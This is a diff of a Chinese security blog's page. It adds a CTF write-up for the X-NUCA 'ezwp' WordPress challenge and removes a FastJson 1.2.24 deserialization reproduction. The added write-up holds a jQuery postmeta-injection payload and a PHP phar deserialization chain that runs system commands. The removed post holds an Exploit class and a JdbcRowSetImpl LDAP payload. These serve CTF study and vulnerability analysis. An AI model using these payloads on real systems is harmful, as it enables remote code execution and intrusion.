@@ -66,6 +66,310 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2020-12-14T12:29:57.146Z" itemprop="datePublished">2020-12-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
+<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
+<p>漏洞分析：<a href="https://paper.seebug.org/774/" target="_blank" rel="noopener">https://paper.seebug.org/774/</a></p>
+<p>对wp和插件对比以下官方下载的，存在以下差异</p>
+<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
+<hr>
+<p>官方</p>
+<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
+                        wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
+                    } elseif ( isset( $_GET[&#39;post&#39;] ) ) {
+                        $post_id = (int) $_GET[&#39;post&#39;];
+                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
+                        $post_id = (int) $_POST[&#39;post_ID&#39;];
+                    } else {
+                        $post_id = 0;
+                    }</code></pre><p>题目</p>
+<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
+                        $post_id = (int) $_GET[&#39;post&#39;];
+                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
+                        $post_id = (int) $_POST[&#39;post_ID&#39;];
+                    } else {
+                        $post_id = 0;
+                    }</code></pre><hr>
+<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
+<p>官方</p>
+<pre><code>空</code></pre><p>题目</p>
+<pre><code>if ( (stristr(file_get_contents($file[&#39;tmp_name&#39;]), &quot;php&quot;) !== FALSE) ) {
+        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#39;Sorry, this file content is not permitted for security reasons.&#39; ) ) );
+    }</code></pre><hr>
+<p>/wp-admin/includes/post.php 221</p>
+<p>array_diff_key 参数少了’file’</p>
+<p>官方</p>
+<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;file&#39;, &#39;guid&#39; ) ) );</code></pre><p>题目</p>
+<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></pre><hr>
+<p>wp-admin/post.php 19行，少了很多条件</p>
+<p>官方</p>
+<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
+    wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
+} elseif ( isset( $_GET[&#39;post&#39;] ) ) {
+    $post_id = (int) $_GET[&#39;post&#39;];
+} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
+    $post_id = (int) $_POST[&#39;post_ID&#39;];
+} else {
+    $post_id = 0;
+}</code></pre><p>题目</p>
+<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
+    $post_id = (int) $_GET[&#39;post&#39;];
+} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
+    $post_id = (int) $_POST[&#39;post_ID&#39;];
+} else {
+    $post_id = 0;
+}</code></pre><p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
+<pre><code>public function unserialize( $serialized ) {
+    }
+
+    /**
+     * @inheritdoc
+     */
+    public function __unserialize( $serialized ) { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound
+    }
+
+    public function __wakeup() { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound
+        unset( $this-&gt;callback );
+    }</code></pre><h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
+<pre><code>    return wp_mail( $recipient, $subject, $body, $headers, $attachments );
+}</code></pre><p>题目：</p>
+<pre><code>return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );
+    }
+
+    public function send_mail($to, $subject, $message, $headers = &#39;&#39;, $attachments = array()) {
+        try {
+            $host = explode(&quot;@&quot;, $to)[1];
+            $url = &quot;http://$host&quot;;
+            $post_data = array(
+                &quot;subject&quot; =&gt; $subject,
+                &quot;message&quot; =&gt; $message,
+                &quot;headers&quot; =&gt; $headers
+            );
+            if ($attachments !== array()) {
+                if (!empty($attachments[0])) {
+                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);
+                }
+            }
+            $ch = curl_init();
+            curl_setopt($ch , CURLOPT_URL , $url);
+            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch , CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
+            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            if ($data) {
+                file_put_contents(&quot;/tmp/1.log&quot;, $data);
+            }
+            return true;
+        } catch (Exception $e) {
+            return false;
+        }
+    }</code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
+<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
+<p>/wp-admin/includes/post.php 221：</p>
+<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></p>
+<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
+<p>/wp-admin/includes/post.php 872：</p>
+<p><code>add_meta( $post_ID );</code></p>
+<pre><code class="php">function add_meta( $post_ID ) {
+    $post_ID = (int) $post_ID;
+
+    $metakeyselect = isset( $_POST[&#39;metakeyselect&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyselect&#39;] ) ) : &#39;&#39;;
+    $metakeyinput  = isset( $_POST[&#39;metakeyinput&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyinput&#39;] ) ) : &#39;&#39;;
+    $metavalue     = isset( $_POST[&#39;metavalue&#39;] ) ? $_POST[&#39;metavalue&#39;] : &#39;&#39;;
+    if ( is_string( $metavalue ) ) {
+        $metavalue = trim( $metavalue );
+    }
+
+    if ( ( ( &#39;#NONE#&#39; !== $metakeyselect ) &amp;&amp; ! empty( $metakeyselect ) ) || ! empty( $metakeyinput ) ) {
+        /*
+         * We have a key/value pair. If both the select and the input
+         * for the key have data, the input takes precedence.
+         */
+        if ( &#39;#NONE#&#39; !== $metakeyselect ) {
+            $metakey = $metakeyselect;
+        }
+
+        if ( $metakeyinput ) {
+            $metakey = $metakeyinput; // Default.
+        }
+
+        if ( is_protected_meta( $metakey, &#39;post&#39; ) || ! current_user_can( &#39;add_post_meta&#39;, $post_ID, $metakey ) ) {
+            return false;
+        }
+
+        $metakey = wp_slash( $metakey );
+
+        return add_post_meta( $post_ID, $metakey, $metavalue );
+    }
+
+    return false;
+}</code></pre>
+<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
+<p>但是我们跟踪以下插件渲染表单的代码发现</p>
+<p>contact-form.php:129</p>
+<p>class WPCF7_ContactForm</p>
+<pre><code class="php">private function __construct( $post = null ) {
+        $post = get_post( $post );
+
+        if ( $post &amp;&amp; self::post_type == get_post_type( $post ) ) {
+            $this-&gt;id = $post-&gt;ID;
+            $this-&gt;name = $post-&gt;post_name;
+            $this-&gt;title = $post-&gt;post_title;
+            $this-&gt;locale = get_post_meta( $post-&gt;ID, &#39;_locale&#39;, true );
+
+            $properties = $this-&gt;get_properties();
+
+            foreach ( $properties as $key =&gt; $value ) {
+                if ( metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key ) ) {
+                    $properties[$key] = get_post_meta( $post-&gt;ID, &#39;_&#39; . $key, true );
+                } elseif ( metadata_exists( &#39;post&#39;, $post-&gt;ID, $key ) ) {
+                    $properties[$key] = get_post_meta( $post-&gt;ID, $key, true );
+                }
+            }
+
+            $this-&gt;properties = $properties;
+            $this-&gt;upgrade();
+        }
+
+        do_action( &#39;wpcf7_contact_form&#39;, $this );
+    }</code></pre>
+<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
+<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
+<p>于是构造</p>
+<pre><code class="javascript">var settings = {
+    &quot;async&quot;: true,
+    &quot;crossDomain&quot;: true,
+    &quot;url&quot;: &quot;/wp-admin/post.php?post=1&quot;,
+    &quot;method&quot;: &quot;POST&quot;,
+    &quot;data&quot;: {
+        &quot;_wpnonce&quot;: document.getElementById(&quot;_wpnonce&quot;).value,
+        &quot;_wp_http_referer&quot;: &quot;%2Fwp-admin%2Fpost-new.php&quot;,
+        &quot;user_ID&quot;: &quot;3&quot;,
+        &quot;action&quot;: &quot;post&quot;,
+        &quot;originalaction&quot;: &quot;editpost&quot;,
+        &quot;post_author&quot;: &quot;3&quot;,
+        &quot;post_type&quot;: &quot;wpcf7_contact_form&quot;,
+        &quot;original_post_status&quot;: &quot;auto-draft&quot;,
+        &quot;auto_draft&quot;: &quot;&quot;,
+        &quot;post_title&quot;: &quot;readflagtotmp2log&quot;,
+        &quot;content&quot;: &quot;test&quot;,
+        &quot;wp-preview&quot;: &quot;&quot;,
+        &quot;hidden_post_status&quot;: &quot;draft&quot;,
+        &quot;post_status&quot;: &quot;draft&quot;,
+        &quot;hidden_post_password&quot;: &quot;&quot;,
+        &quot;hidden_post_visibility&quot;: &quot;public&quot;,
+        &quot;visibility&quot;: &quot;public&quot;,
+        &quot;post_password&quot;: &quot;&quot;,
+        &quot;mm&quot;: &quot;12&quot;,
+        &quot;jj&quot;: &quot;22&quot;,
+        &quot;_thumbnail_id&quot;: &quot;-1&quot;,
+        &quot;advanced_view&quot;: &quot;1&quot;,
+        &quot;comment_status&quot;: &quot;open&quot;,
+        &quot;ping_status&quot;: &quot;open&quot;,
+        &quot;post_name&quot;: &quot;&quot;,
+        &quot;metakeyinput&quot;:&quot;mail&quot;,
+        &quot;metavalue[subject]&quot;: &quot;test \&quot;[your-subject]\&quot;&quot;,
+        &quot;metavalue[sender]&quot;: &quot;2&quot;,
+        &quot;metavalue[recipient]&quot;: &quot;ccreater@172.16.8.6:60000&quot;,
+        &quot;metavalue[body]&quot;: &quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;,
+        &quot;metavalue[additional_headers]&quot;: &quot;Reply-To: [your-email]&quot;,
+        &quot;metavalue[attachments]&quot;: &quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;,
+        &quot;metavalue[use_html]&quot;: &quot;false&quot;,
+        &quot;metavalue[exclude_blank]&quot;: &quot;false&quot;,
+        &quot;metakeyselect&quot;:&quot;#NONE#&quot;
+
+    }
+}
+jQuery.ajax(settings).done(function (response) {
+    console.log(response);
+});</code></pre>
+<p>在dashboard那里执行这个js</p>
+<p>成功写入<code>mail</code>:</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
+<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code class="php">&lt;?php
+
+namespace Kigkonsult\Icalcreator{
+    class Vtimezone{
+        public $timezonetype;
+        public $components;
+        public function __construct($val)
+        {
+            $this-&gt;components = $val;
+        }
+    }
+}
+namespace {
+
+    require( &#39;wp-load.php&#39; );  //???????
+    require_once( dirname( __FILE__ ) . &#39;/wp-includes/Requests/Utility/FilteredIterator.php&#39; );
+    $arr  = array(
+        &quot;1&quot; =&gt; &quot;/readflag&gt;/tmp/2.log&quot;  //payload
+    );
+    $obj_ = new Requests_Utility_FilteredIterator( $arr, &quot;system&quot; );
+    $obj  = new Kigkonsult\Icalcreator\Vtimezone( $obj_ );
+
+
+    @unlink( &quot;test.gif&quot; );
+    $phar = new Phar( &quot;test.phar&quot; );
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub( base64_decode( &quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot; ) . &quot; __HALT_COMPILER(); ?&gt;&quot; );
+    $phar-&gt;setMetadata( $obj );
+    $phar-&gt;addFromString( &quot;test.txt&quot;, &quot;test&quot; ); //????????
+    //??????
+    $phar-&gt;stopBuffering();
+    rename( &quot;test.phar&quot;, &quot;test.gif&quot; );
+}
+</code></pre>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/12/14/2020xnuca_ezwp题解/">http://blog.ccreater.top/2020/12/14/2020xnuca_ezwp题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="ckiojbub80000y0vd6w4ge78v" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
@@ -2146,434 +2450,6 @@ function fuck(){
 
 
   
-    <article id="post-FastJson1.2.24调试记录_复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-10-05T15:58:55.968Z" itemprop="datePublished">2020-10-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="FastJson1-2-23-反序列化复现"><a href="#FastJson1-2-23-反序列化复现" class="headerlink" title="FastJson1.2.23 反序列化复现"></a>FastJson1.2.23 反序列化复现</h1><p>漏洞exp:</p>
-<pre><code class="java">public class Exploit implements ObjectFactory {
-    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) {
-        exec(&quot;xterm&quot;);
-        return null;
-    }
-
-    public static String exec(String var0) {
-        try {
-            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
-        } catch (IOException var2) {
-            var2.printStackTrace();
-        }
-
-        return &quot;&quot;;
-    }
-
-}</code></pre>
-<p>FastJsonTest.java</p>
-<pre><code class="java">public class App 
-{
-    public static void main( String[] args )
-    {
-        String payload=&quot;{\n&quot; +
-                &quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +
-                &quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,&quot; +
-                &quot;    \&quot;autoCommit\&quot;:true\n&quot; +
-                &quot;}&quot;;
-
-        JSON.parseObject(payload);
-    }
-}</code></pre>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一步一步跟进去在<br>parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)<br>发现了关于@type的处理</p>
-<pre><code>if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
-    String typeName = lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);
-    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
-
-    ...
-
-    ObjectDeserializer deserializer = config.getDeserializer(clazz);
-    return deserializer.deserialze(this, clazz, fieldName);
-}</code></pre><p>跟下去观察到是通过<code>Thread.currentThread().getContextClassLoader().loadClass(className);</code><br>来加载@type的对应的值<br>跟进config.getDeserializer(clazz);<br>最后是通过<code>derializer = createJavaBeanDeserializer(clazz, type);</code>来生成反序列化处理器</p>
-<pre><code>public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) {
-        boolean asmEnable = this.asmEnable;//不是安卓设备则为true
-        if (asmEnable) {
-            JSONType jsonType = clazz.getAnnotation(JSONType.class);
-
-            if (jsonType != null) {//检测是否存在JSONType注释
-                ...
-            }
-
-            if (asmEnable) {
-                Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null
-                if (superClass == null) {
-                    superClass = clazz;
-                }
-
-                for (;;) {//检查clazz及其所有父类是否均为public
-                    if (!Modifier.isPublic(superClass.getModifiers())) {
-                        asmEnable = false;
-                        break;
-                    }
-
-                    superClass = superClass.getSuperclass();
-                    if (superClass == Object.class || superClass == null) {
-                        break;
-                    }
-                }
-            }
-        }
-
-        if (clazz.getTypeParameters().length != 0) {//没有使用泛型
-            asmEnable = false;
-        }
-
-        if (asmEnable &amp;&amp; asmFactory != null &amp;&amp; asmFactory.classLoader.isExternalClass(clazz)) {
-            asmEnable = false;
-        }
-
-        if (asmEnable) {//类名不存在.和不可见字符
-            asmEnable = ASMUtils.checkName(clazz.getSimpleName());
-        }
-
-        if (asmEnable) {
-            if (clazz.isInterface()) {
-                asmEnable = false;
-            }
-            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
-
-            if (asmEnable &amp;&amp; beanInfo.fields.length &gt; 200) {
-                asmEnable = false;
-            }
-
-            Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;
-            if (asmEnable &amp;&amp; defaultConstructor == null &amp;&amp; !clazz.isInterface()) {
-                asmEnable = false;
-            }
-
-            for (FieldInfo fieldInfo : beanInfo.fields) {
-                ...
-            }
-        }
-
-        if (asmEnable) {
-            if (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) {
-                asmEnable = false;
-            }
-        }
-
-        if (!asmEnable) {
-            return new JavaBeanDeserializer(this, clazz, type);
-        }
-
-        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
-        try {
-            return asmFactory.createJavaBeanDeserializer(this, beanInfo);
-            // } catch (VerifyError e) {
-            // e.printStackTrace();
-            // return new JavaBeanDeserializer(this, clazz, type);
-        } catch (NoSuchMethodException ex) {
-            return new JavaBeanDeserializer(this, clazz, type);
-        } catch (JSONException asmError) {
-            return new JavaBeanDeserializer(this, beanInfo);
-        } catch (Exception e) {
-            throw new JSONException(&quot;create asm deserializer error, &quot; + clazz.getName(), e);
-        }
-    }</code></pre><p>阅读代码发现：</p>
-<pre><code>1. 不是安卓设备
-2. clazz是否存在JSONType注释
-3. clazz及其所有父类都是public
-4. clazz类的声明没有使用泛型
-5. clazz的类名不存在.</code></pre><p>经过上述检查后进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></p>
-<pre><code>
-    public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) {
-        JSONType jsonType = clazz.getAnnotation(JSONType.class);
-
-        Class&lt;?&gt; builderClass = getBuilderClass(jsonType);
-
-        Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段
-        Method[] methods = clazz.getMethods();//获取所有public方法
-
-        Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);
-        Constructor&lt;?&gt; creatorConstructor = null;
-        Method buildMethod = null;
-
-        List&lt;FieldInfo&gt; fieldList = new ArrayList&lt;FieldInfo&gt;();
-
-        if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) {
-           ... 
-        }
-
-        if (defaultConstructor != null) {
-            TypeUtils.setAccessible(defaultConstructor);
-        }
-
-        if (builderClass != null) {
-            ...
-        }
-
-        for (Method method : methods) { //
-            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
-            String methodName = method.getName();
-            if (methodName.length() &lt; 4) {
-                continue;
-            }//方法名大于4
-
-            if (Modifier.isStatic(method.getModifiers())) {
-                continue;
-            }//非静态方法
-
-            // support builder set
-            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
-                continue;
-            }//返回值是void 或 clazz类
-            Class&lt;?&gt;[] types = method.getParameterTypes();
-            if (types.length != 1) {
-                continue;
-            }//只有一个参数
-
-            ...
-
-            if (!methodName.startsWith(&quot;set&quot;)) { // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
-                continue;
-            }//方法名以set开头
-
-            char c3 = methodName.charAt(3);
-
-            String propertyName;
-            if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f
-                || c3 &gt; 512 // for unicode method name
-            ) //获得set方法对应的字段
-            {
-                if (TypeUtils.compatibleWithJavaBean) {
-                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
-                } else {
-                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
-                }
-            } else if (c3 == &#39;_&#39;) {
-                propertyName = methodName.substring(4);
-            } else if (c3 == &#39;f&#39;) {
-                propertyName = methodName.substring(3);
-            } else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) {
-                propertyName = TypeUtils.decapitalize(methodName.substring(3));
-            } else {
-                continue;
-            }
-
-            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
-            if (field == null &amp;&amp; types[0] == boolean.class) {//字段不存在或是bool型
-                String isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
-                field = TypeUtils.getField(clazz, isFieldName, declaredFields);
-            }
-
-            ...
-
-            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
-                                         annotation, fieldAnnotation, null));//添加到fieldList
-        }
-
-        for (Field field : clazz.getFields()) { // 添加非静态字段
-            int modifiers = field.getModifiers();
-            if ((modifiers &amp; Modifier.STATIC) != 0) {//不允许STATIC
-                continue;
-            }
-
-            if((modifiers &amp; Modifier.FINAL) != 0) {
-                Class&lt;?&gt; fieldType = field.getType();
-                boolean supportReadOnly = Map.class.isAssignableFrom(fieldType) 
-                        || Collection.class.isAssignableFrom(fieldType)
-                        || AtomicLong.class.equals(fieldType) //
-                        || AtomicInteger.class.equals(fieldType) //
-                        || AtomicBoolean.class.equals(fieldType);
-                if (!supportReadOnly) {
-                    continue;
-                }
-            }
-
-            boolean contains = false;
-            for (FieldInfo item : fieldList) {
-                if (item.name.equals(field.getName())) {
-                    contains = true;
-                    break; // 已经是 contains = true，无需继续遍历
-                }
-            }
-
-            if (contains) {
-                continue;
-            }
-
-            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
-            String propertyName = field.getName();
-
-            ...
-
-            add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,
-                                         fieldAnnotation, null));
-        }
-
-        for (Method method : clazz.getMethods()) { // getter methods
-            String methodName = method.getName();
-            if (methodName.length() &lt; 4) {
-                continue;
-            }
-
-            if (Modifier.isStatic(method.getModifiers())) {
-                continue;
-            }
-
-            if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) {
-                if (method.getParameterTypes().length != 0) {
-                    continue;
-                }
-
-                if (Collection.class.isAssignableFrom(method.getReturnType()) //
-                    || Map.class.isAssignableFrom(method.getReturnType()) //
-                    || AtomicBoolean.class == method.getReturnType() //
-                    || AtomicInteger.class == method.getReturnType() //
-                    || AtomicLong.class == method.getReturnType() //
-                ) {
-                    String propertyName;
-
-                    ...
-
-                    FieldInfo fieldInfo = getField(fieldList, propertyName);
-                    if (fieldInfo != null) {
-                        continue;
-                    }
-
-                    if (propertyNamingStrategy != null) {
-                        propertyName = propertyNamingStrategy.translate(propertyName);
-                    }
-
-                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));
-                }
-            }
-        }
-
-        return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);
-    }
-</code></pre><p>大致总结一下会将哪些字段添加到FieldList中：</p>
-<pre><code>1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）
-2. 非Static和Final的字段（是的话要满足某些条件）
-3. 返回值是满足某些条件的非静态get方法对应的字段</code></pre><p>最后返回排序后的FieldList,生成deserializer<br>接着调用了<code>return deserializer.deserialze(this, clazz, fieldName);</code><br>在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入<code>parseField</code><br><code>@type</code>字典下的其他字段,会进入<br><code>boolean match = parseField(parser, key, object, type, fieldValues);</code></p>
-<pre><code>    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
-                              Map&lt;String, Object&gt; fieldValues) {
-        JSONLexer lexer = parser.lexer; // xxx
-
-        FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null
-
-        final int mask = Feature.SupportNonPublicField.mask;
-        ...
-
-        lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());
-
-        fieldDeserializer.parseField(parser, object, objectType, fieldValues);
-
-        return true;
-    }</code></pre><p>在fieldList字段查找存在后进入<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p>
-<pre><code>    public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) {
-        ...
-        Object value;
-        if (fieldValueDeserilizer instanceof JavaBeanDeserializer) {
-            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;
-            value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);
-        } else {
-            ...
-            } else {
-                value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值
-            }
-        }
-        if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) {
-            ...
-        } else {
-            if (object == null) {
-                fieldValues.put(fieldInfo.name, value);
-            } else {
-                setValue(object, value);//进入这里
-            }
-        }
-    }</code></pre><p>最后进入setValue</p>
